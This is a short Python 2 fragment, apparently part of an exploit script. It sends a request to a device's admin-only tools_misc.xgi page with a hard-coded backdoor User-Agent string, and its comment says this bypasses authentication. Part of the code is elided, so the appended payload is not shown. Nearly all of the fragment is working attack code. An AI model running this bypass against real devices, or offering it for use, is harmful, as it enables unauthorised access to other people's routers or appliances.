# Normally only admins can access the tools_misc.xgi page;
# use the backdoor user-agent to bypass authentication
import urllib2
# ...
req = urllib2.Request(url+buf,
	headers={
		'User-Agent': 'xmlset_roodkcableoj28840ybtide'
	})
urllib2.urlopen(req)
